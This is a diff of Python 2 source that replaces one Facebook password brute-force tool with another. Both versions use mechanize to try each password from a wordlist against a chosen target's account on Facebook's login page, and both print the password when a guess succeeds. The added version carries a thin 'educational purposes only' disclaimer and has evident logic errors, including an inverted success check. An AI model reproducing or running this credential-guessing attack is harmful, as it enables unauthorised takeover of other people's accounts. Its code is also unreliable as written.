@@ -1,121 +1,122 @@
-# uncompyle6 version 3.7.4
-# Python bytecode 2.7
-# Decompiled from: Python 2.7.18 (default, Jul  8 2020, 22:53:57) 
-# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
-import os, sys, mechanize, cookielib, random, time
-os.system('clear')
-
-def runntek(s):
-    for c in s + '\n':
-        sys.stdout.write(c)
-        sys.stdout.flush()
-        time.sleep(10.0 / 100)
+<pre class="ndfHFb-c4YZDc-fmcmS-DARUcf">#!usr/bin/python
+#Facebook Cracker Version 2 can crack into Facebook Database 100% without Interruption By Facebook Firewall !
+#This program is for educational purposes only.
+#Don't attack people facebook accounts it's illegal ! 
+#If you want to crack into someone's account, you must have the permission of the user. 
+#InfosecHacker is not responsible.
 
 
-if sys.platform == 'linux' or sys.platform == 'linux2':
-    GL = '\x1b[96;1m'
-    BB = '\x1b[34;1m'
-    YY = '\x1b[33;1m'
-    GG = '\x1b[32;1m'
-    WW = '\x1b[0;1m'
-    RR = '\x1b[31;1m'
-    CC = '\x1b[36;1m'
-    B = '\x1b[34m'
-    Y = '\x1b[33;1m'
-    G = '\x1b[32m'
-    W = '\x1b[0;1m'
-    R = '\x1b[31m'
-    C = '\x1b[36;1m'
-    rand = (BB, YY, GG, WW, RR, CC)
-    P = random.choice(rand)
-
-def cover():
-    print '\n    \n    \n    \n    \n     '
-    runntek(GL + '      [-_-] HALLO PENGGEMAR MR.W4W4N [-_-]')
-    time.sleep(1)
-    print ' '
-    print WW + '      \xe2\x96\x84\xe2\x96\x84'
-    print WW + '     \xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88' + GL + '       AUTHOR : ' + R + ' Mr.W4W4N'
-    print WW + '     \xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88' + GL + '       GITHUB : ' + R + ' https://github.com/Mr.W4W4N'
-    print WW + '\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84' + GL + '    WA     : ' + R + ' 085782505676'
-    print B + '\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93' + WW + '\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88' + GL + '   FUNGSI : ' + R + ' Hack Facebook Narget'
-    print B + '\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93' + WW + '\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88'
-    print B + '\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93' + WW + '\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88' + GL + '   >> ' + R + ' JANGAN RECODE YA BANGSAT'
-    print B + '\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93' + WW + '\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88' + GL + '   >> ' + R + ' CAPEK GUA BUATNYA BANGSAT'
-    print WW + '\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88'
-    print WW + ' '
+import sys
+import random
+import mechanize
+import cookielib
 
 
-cover()
-email = str(raw_input(GG + '[?]' + YY + ' Masukkan ID Target' + B + ' : '))
-passwordlist = str(raw_input(GG + '[?]' + YY + ' KETIK password.txt' + B + ' : '))
+GHT = '''
+        +=========================================+
+        |..........Facebook Cracker v 2...........|
+        +-----------------------------------------+
+        |#Author: InfoSecHacker          |
+        |#Contact: www.twitter.com/abhishekmani002|
+        |#Date: 23/10/2015                        |
+        |#This tool is made for pentesting.       |
+        |#Changing the Description of this tool   |
+        |Won't made you the coder ^_^ !!!         |
+        |#Respect Coderz ^_^                      |
+        |#I take no responsibilities for the      |
+        |  use of this program !                  |
+        +=========================================+
+        |..........Facebook Cracker v 2...........|
+        +-----------------------------------------+
+'''
+print "Note: - This tool can crack facebook account even if you don't have the email of your victim"
+print "# Hit CTRL+C to quit the program"
+print "# Use www.graph.facebook.com for more infos about your victim ^_^"
+
+
+email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
+passwordlist = str(raw_input("Enter the name of the password list file : "))
+
+useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+
+
+
 login = 'https://www.facebook.com/login.php?login_attempt=1'
-useragents = [
- ('Mozilla/5.0 (Linux; Android 5.1.1; A33f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36) Geck')]
+def attack(password):
 
-def runntek(s):
-    for c in s + '\n':
-        sys.stdout.write(c)
-        sys.stdout.flush()
-        time.sleep(10.0 / 100)
+  try:
+     sys.stdout.write("\r[*] trying %s.. " % password)
+     sys.stdout.flush()
+     br.addheaders = [('User-agent', random.choice(useragents))]
+     site = br.open(login)
+     br.select_form(nr=0)
 
-
-def main():
-    global br
-    br = mechanize.Browser()
-    cj = cookielib.LWPCookieJar()
-    br.set_handle_robots(False)
-    br.set_handle_redirect(True)
-    br.set_cookiejar(cj)
-    br.set_handle_equiv(True)
-    br.set_handle_referer(True)
-    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-    welcome()
-    lagi()
-    search()
-    print ' '
-    runntek(R + 'MAAF PASSWORD TIDAK DI TEMUKAN')
-    runntek(R + 'BUATLAH LAGI password/Wordlist Kamu')
-    time.sleep(1)
-    print WW + '[-_-] [-_-] [-_-] '
-
-
-def brute(password):
-    sys.stdout.write(W + ('\r[+]  Mencoba..... {}').format(password))
-    sys.stdout.flush()
-    br.addheaders = [('User-agent', random.choice(useragents))]
-    site = br.open(login)
-    br.select_form(nr=0)
-    br.form['email'] = email
-    br.form['pass'] = password
-    sub = br.submit()
-    log = sub.geturl()
-    if log != login and 'login_attempt' not in log:
-        print ('\x1b[92;1m\n\n[+]\x1b[97;1m INI ADALAH PASSWORDNYA \x1b[31;1m===> \x1b[96;1m{}').format(password)
-        print ' '
-        raw_input(CC + '......TEKAN ENTER UNTUK KELUAR.....')
+      
+         
+     ##Facebook
+     br.form['email'] =email
+     br.form['pass'] = password
+     br.submit()
+     log = br.geturl()
+     if log == login:
+        print "\n\n\n [*] Password found .. !!"
+        print "\n [*] Password : %s\n" % (password)
         sys.exit(1)
-
+  except KeyboardInterrupt:
+        print "\n[*] Exiting program .. "
+        sys.exit(1)
 
 def search():
     global password
-    passwords = open(passwordlist, 'r')
     for password in passwords:
-        passwords = password.replace('\n', '')
-        brute(password)
+        attack(password.replace("\n",""))
 
 
-def welcome():
-    print GG + '\n     \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n     \xe2\x80\x96  INDONESIA DARK TERMUX ASSOCIATE   \xe2\x80\x96\n     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n     |    \xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97     \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97     |\n     |    \xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x94\xe2\x95\x9d     \xe2\x95\x91\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91     |\n     |    \xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\xa0\xe2\x95\xa3\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x97\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x97     \xe2\x95\x91\xe2\x95\x94\xe2\x95\x9d \xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91     |\n     |    \xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d     |\n     |\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90|\n      '
 
+def check():
 
-def lagi():
-    total = open(passwordlist, 'r')
-    total = total.readlines()
-    print WW + ('     [*] Account to crack : {}').format(email)
-    print WW + '     [*] JUMLAH WORDLIST  :', len(total), WW + 'passwords'
-    print WW + '     [*] LAGI CRACKING MOHON TUNGGU .....\n\n'
-
+    global br
+    global passwords
+    try:
+       br = mechanize.Browser()
+       cj = cookielib.LWPCookieJar()
+       br.set_handle_robots(False)
+       br.set_handle_equiv(True)
+       br.set_handle_referer(True)
+       br.set_handle_redirect(True)
+       br.set_cookiejar(cj)
+       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+    except KeyboardInterrupt:
+       print "\n[*] Exiting program ..\n"
+       sys.exit(1)
+    try:
+       list = open(passwordlist, "r")
+       passwords = list.readlines()
+       k = 0
+       while k &lt; len(passwords):
+          passwords[k] = passwords[k].strip()
+          k += 1
+    except IOError:
+        print "\n [*] Error: check your password list path \n"
+        sys.exit(1)
+    except KeyboardInterrupt:
+        print "\n [*] Exiting program ..\n"
+        sys.exit(1)
+    try:
+        print GHT
+        print " [*] Account to crack : %s" % (email)
+        print " [*] Loaded :" , len(passwords), "passwords"
+        print " [*] Cracking, please wait ..."
+    except KeyboardInterrupt:
+        print "\n [*] Exiting program ..\n"
+        sys.exit(1)
+    try:
+        search()
+        attack(password)
+    except KeyboardInterrupt:
+        print "\n [*] Exiting program ..\n"
+        sys.exit(1)
 
 if __name__ == '__main__':
-    main()
+    check()
+</pre>
